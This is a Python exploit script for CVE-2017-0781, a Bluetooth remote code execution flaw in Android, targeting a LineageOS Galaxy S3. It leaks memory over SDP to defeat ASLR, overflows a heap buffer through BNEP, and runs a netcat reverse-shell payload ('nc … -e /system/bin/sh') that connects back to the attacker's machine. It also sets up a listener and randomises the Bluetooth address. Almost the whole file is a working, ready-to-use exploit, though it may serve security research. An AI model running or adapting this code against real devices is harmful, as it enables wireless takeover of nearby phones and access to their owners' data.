#!/usr/bin/env python2

"""
This script demonstrates the Remote Code Exection vulnerability CVE-2017-0781 on
a Samsung Galaxy S3 phone running LineageOS based on Android 7.1.2.
"""

import os
import sys
if os.getuid != 0:
    sys.exit("Sadly, this script must be run as root as it requires direct interaction with the local bluetooth hardware. It is advised to run this program inside a VM to not to pose a danger to your productive system.")

import binascii
import select
import struct
import time
from argparse import ArgumentParser
import bluetooth
from bluetooth import _bluetooth as bt
import utility_stuff as util
import sdp
import config
from pwn import log

# TCP port that need to be opened on the attacker machine. Will be set by argparse
NETCAT_PORT = None
# IP address to reconnect to (attacker IP)
LOCAL_IP = None
# Global storage for the device configuration used for bypassing ASLR
DEVICE_CONFIG = None

MAX_BT_NAME = 0xf5          # Maximum length of REMOTE_NAME
BNEP_PSM = 15               # PSM for BNEP

# Payload details (attacker IP should be accessible over the internet for the victim phone)
PAYLOAD = b'nc {ip} {port} -e /system/bin/sh'
ITERATIONS = 300            # Number of overflow causing package to send to trigger exploit
PWNING_TIMEOUT = 3          # Timeout between pwn attempts
PWN_ATTEMPTS = 1            # Number of attempts for running the exploit
LEAK_ATTEMPTS = 1           # Number of attempts for trying to leak memory


def set_bt_name(name, src_hci, src, dst):
    """
    Sets the name of the local bluetooth device to 'name'.

    Params:
        - 'name' - The new name of the device
        - 'src_hci' - Name of the bluetooth device to change the name of
        - 'src' - The bluetooth address of the local device
        - 'dst' - Bluetooth address of a remote device to temporarily connect with
                  (sets the REMOTE_NAME in 'dst')
    """
    # Create raw HCI sock to set our BT name
    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
    flt = bt.hci_filter_new()
    bt.hci_filter_all_ptypes(flt)
    bt.hci_filter_all_events(flt)
    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)

    # Send raw HCI command to controller (first 3 bytes are padding for alignment)
    raw_sock.sendall(binascii.unhexlify('01130cf8cccccc') + name.ljust(MAX_BT_NAME, b'\x00'))
    raw_sock.close()
    time.sleep(0.1)

    # Connect to BNEP to "refresh" the name
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))
    bnep.close()

    # Close ACL connection again
    util.exec_command_block(["hcitool", "dc", dst])


def set_rand_bdaddr(src_hci, return_value=None):
    """
    Sets the bluetooth address of 'src_hci' to a randomly chosen address and
    returns the random address. If 'return_value' is not 'None', its value will
    be returned instead without changing the bluetooth address.

    Params:
        - 'src_hci' - The local device to change the address of
        - 'return_value' - Optional return value to return instead of the new
                           address

    Returns:
        The new randomly chosen adress or the value of 'return_value' if set.
    """
    if return_value:
        return return_value

    prog = log.progress("Setting new BDADDR for %s" % (src_hci,))
    addr = ['%02x' % (ord(c),) for c in os.urandom(6)]
    final_addr = ':'.join(addr)

    # Invoke bdaddr to change the address
    code, _ = util.exec_command_block(["./bdaddr", "-i", src_hci, "-r", final_addr])
    if code != 0:
        prog.failure("Failed to change BDADDR!")
        sys.exit(1)

    # Many bluetooth dongles have to be reconnected for the changes to apply
    prog.status("Reconnect %s to complete the operation" % (src_hci,))
    while bt.hci_devid(final_addr) < 0:
        time.sleep(0.1)
    prog.success("Successfully changed BDADDR")
    return final_addr


def pwn(src_hci, dst, system_addr, name_addr, local_addr=None):
    """
    Executes the exploit itself in order to spawn a reverse shell.

    Params:
        - 'src_hci' - The local bluetooth device to use
        - 'dst' - The target device to exploit
        - 'system_addr' - The real address of the system function
        - 'name_addr' - The real address of the REMOTE_NAME variable
        - 'local_addr' - The local address to use for the source device ('None'
                         if it should be chosen randomly)
    """

    # Get new BDADDR to prevent caching of device name
    src = set_rand_bdaddr(src_hci, local_addr)

    # Payload is: '"\x17AAAAAAsysm";\n<shell_commands>\n#'
    # 0x1700 == (0x1722 & 0xff00) is the "event"-member of the "HORRIBLE_HACK" message.
    payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr) + b'";\n' + \
                          PAYLOAD + b'\n#'

    # Check if payload is not longer than REMOTE_NAME
    if len(payload) > MAX_BT_NAME:
        log.failure("Payload is longer than allowed by REMOTE_NAME!")
        sys.exit(1)

    # Check if payload contains NULL bytes
    if b'\x00' in payload:
        log.failure("NULL byte in payload! Pwning not possible!")
        sys.exit(1)

    log.info("Payload: %s" % (payload,))
    set_bt_name(payload, src_hci, src, dst)

    # Reconnect via BNEP to put the payload in REMOTE_NAME
    prog = log.progress('Connecting to BNEP again')
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))
    prog.success()

    # Send several messages for heap shaping -> increase chance to trigger vulnerable function
    prog = log.progress('Pwning...')
    for _ in range(20):
        bnep.send(binascii.unhexlify('8109' + '800109' * 100))

    # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
    # This is highly likely to fully overflow over instances of "list_node_t" which is exactly
    # 8 bytes long.
    # Eventually one overflow causes a call to "btu_hci_msg_process" with "p_msg"
    # under our control, where "p_msg" points to REMOTE_NAME and thus to the
    # real payload
    for _ in range(ITERATIONS):
        # If we're blocking here, the daemon has crashed
        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
        if not writeable:
            break

        # Send a message that causes an overflow with the address of REMOTE_NAME
        # in which the payload is stored
        bnep.send(binascii.unhexlify('810100') + struct.pack('<II', 0, name_addr))
    else:
        log.info("Looks like it didn't crash. Possibly worked")
        return True
    prog.success()
    return False


def get_base_addresses(src, dst):
    """
    Performs the CVE-2017-0781 memory leak in order to get the base addresses of
    libc.so and bluetooth.default.so.

    *NOTE*: This function is highly dependent on specific versions of libc and
    bluetooth.default.so. If you do not use the specific offsets of the
    targeted device the exploit will not work and will crash the remote bluetooth
    service at the most.

    Params:
        - 'src' - Address of the local device
        - 'dst' - Address of the target device to leak data from

    Returns:
        The base address of libc.so and the base address of bluetooth.default.so
    """
    prog = log.progress('Doing stack memory leak...')

    # Get leaked stack data. This memory leak gets "deterministic garbage" from the stack.
    result = sdp.do_sdp_info_leak(dst, src)

    # Prints the leak result as a matrix; needed to get "libc_leak_idx" and
    # "bluetooth_leak_idx"
    # util.print_result(result)

    # Calculate according to known libc.so and bluetooth.default.so binaries
    x, y = DEVICE_CONFIG["libc_leak_idx"]
    libc_offset = result[x][y]
    x, y = DEVICE_CONFIG["bluetooth_leak_idx"]
    bluetooth_var_offset = result[x][y]
    log.info("Leaked libc data: 0x%08x\tLeaked bluetooth data: 0x%08x" % (libc_offset, bluetooth_var_offset))

    libc_base = libc_offset - DEVICE_CONFIG["libc_leak_data"]
    bluetooth_base = bluetooth_var_offset - DEVICE_CONFIG["bluetooth_leak_data"]
    log.info('libc base: 0x%08x\t\tbluetooth base: 0x%08x' % (libc_base, bluetooth_base))

    # Close SDP ACL connection again
    util.exec_command_block(["hcitool", "dc", dst])
    time.sleep(0.1)

    prog.success()
    return libc_base, bluetooth_base


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("--address", type=str, action="store", required=False, default=None, help="The IP address to connect the reverse shell to (own IP)")
    parser.add_argument("-t", "--target", type=str, action="store", required=False, default=None, help="Bluetooth address of exploit target")
    parser.add_argument("-p", "--port", type=int, action="store", required=False, default=4444, help="Port to reconnect the remote shell to")
    parser.add_argument("-a", "--attempts", type=int, action="store", required=False, default=1, help="Number of pwning and leak attempts")
    parser.add_argument("--timeout", type=int, action="store", required=False, default=5, help="Timeout between pwning attempts")
    parser.add_argument("--no-addr", action="store_true", required=False, default=False, help="Prevents setting the local bluetooth address to a new value")
    parser.add_argument("--no-xterm", action="store_true", required=False, default=False, help="Prevents program from automatically opening a new xterm with a netcat listener")

    grp = parser.add_mutually_exclusive_group(required=True)
    grp.add_argument("-d", "--device", type=str, action="store", help="The device configuration to use for the exploit")
    grp.add_argument("-l", "--list-devices", action="store_true", default=False, help="List all available device configurations")
    args = parser.parse_args()

    configs = config.get_configs_from_file()
    if len(configs) <= 0:
        log.failure("No valid device configurations available!")
        sys.exit(1)

    if args.list_devices:
        print "Available configurations:"
        for dev in configs.keys():
            print "\t- %s" % (dev,)
        sys.exit(0)

    DEVICE_CONFIG = configs.get(args.device, None)
    if not DEVICE_CONFIG:
        log.failure("No configuration '%s' available!" % (args.device,))
        sys.exit(1)
    log.info("Using configuration for device %s" % (args.device,))

    if args.target and not util.is_valid_bdaddr(str(args.target)):
        log.failure("Target address '%s' is not a valid Bluetooth address!" % (args.target,))
        sys.exit(1)

    if not args.address:
        args.address = util.get_local_ip()

    if not args.address or not util.is_valid_ip(args.address):
        log.failure("'%s' is not a valid IP address!" % (args.address,))
        sys.exit(1)
    LOCAL_IP = args.address

    if args.port < 0 or args.port > 65535:
        log.failure("Port %d is not a valid port number!" % (args.port,))
        sys.exit(1)
    NETCAT_PORT = args.port
    PAYLOAD = PAYLOAD.format(ip=LOCAL_IP, port=NETCAT_PORT)

    if args.attempts < 1:
        log.failure("Invalid number of attempts: %d" % (args.attempts,))
        sys.exit(1)
    PWN_ATTEMPTS = args.attempts
    LEAK_ATTEMPTS = args.attempts

    if args.timeout < 1:
        log.failure("Timeout %d is not valid!" % (args.timeout,))
        sys.exit(1)
    PWNING_TIMEOUT = args.timeout

    hci, local_addr = util.get_local_dev()
    if not hci:
        log.failure("No local bluetooth device found!")
        sys.exit(1)
    log.info("Using local bluetooth device %s with address %s" % (hci, local_addr))

    if not args.target:
        target_addr = util.get_target()
        if not target_addr:
            log.failure("No target for exploit!")
            sys.exit(1)
        if not util.is_valid_bdaddr(target_addr):
            log.failure("Target address is not valid!")
            sys.exit(1)
    else:
        target_addr = args.target
    log.info("Using %s as exploit target" % (target_addr))

    # Disable Simple Pairing Mode and disconnect from target if there is a connection
    code, ret = util.exec_command_block(["hciconfig", hci, "sspmode", "0"])
    if code != 0:
        sys.exit(1)
    os.system("hcitool dc %s &> /dev/null" % (target_addr,))

    # Open netcat listener for incoming reverse shell if desired; otherwise
    # the listener has to be opened manually
    if not args.no_xterm:
        util.open_listening_shell(NETCAT_PORT)
    else:
        log.info("Please manually open a listener on %s:%d" % (LOCAL_IP, NETCAT_PORT,))

    # Try to exploit the target
    for iteration in range(PWN_ATTEMPTS):
        log.info("Exploit attempt %d" % (iteration))

        # Get a new random BDADDR to defeat name caching
        src = set_rand_bdaddr(hci, local_addr if args.no_addr else None)

        # Try to leak library base addresses
        for leak in range(LEAK_ATTEMPTS):
            libc_base, bluetooth_base = get_base_addresses(src, target_addr)

            # Check if base addresses may be valid; libraries are always loaded
            # at "even" addresses
            if (libc_base & 0xfff == 0) and (bluetooth_base & 0xfff == 0):
                break
        else:
            log.failure("Failed to leak memory! Wrong library versions?")
            sys.exit(1)

        system_addr = DEVICE_CONFIG["system_offset"] + libc_base
        name_addr = DEVICE_CONFIG["remote_name_offset"] + bluetooth_base

        # REMOTE_NAME address must be aligned to 4 bytes as ARM does not allow
        # accesses to unaligned data
        if not name_addr % 4 == 0:
            log.failure("The address of the payload is not aligned to 4 bytes, but is required by ARM!")
            sys.exit(1)

        log.info("Address of system: 0x%08x" % (system_addr))
        log.info("Address of REMOTE_NAME: 0x%08x" % (name_addr))

        if pwn(hci, target_addr, system_addr, name_addr, local_addr if args.no_addr else None):
            log.success("Success!")
            break
    else:
        assert False, "All pwn attempts failed!"
